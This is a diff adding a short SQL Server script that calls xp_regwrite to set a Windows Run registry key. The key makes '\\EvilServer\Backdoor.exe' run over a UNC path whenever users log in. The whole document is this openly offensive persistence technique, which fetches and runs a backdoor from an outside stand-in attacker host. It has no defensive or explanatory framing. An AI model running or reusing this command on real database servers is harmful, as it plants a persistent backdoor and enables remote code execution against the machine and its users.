@@ -1,0 +1,10 @@
+---------------------------------------------
+-- Use SQL Server xp_regwrite to configure 
+-- a file to run via UNC Path when users login
+----------------------------------------------
+EXEC master..xp_regwrite
+@rootkey     = 'HKEY_LOCAL_MACHINE',
+@key         = 'Software\Microsoft\Windows\CurrentVersion\Run',
+@value_name  = 'EvilSauce',
+@type        = 'REG_SZ',
+@value       = '"\\EvilServer\Backdoor.exe"'
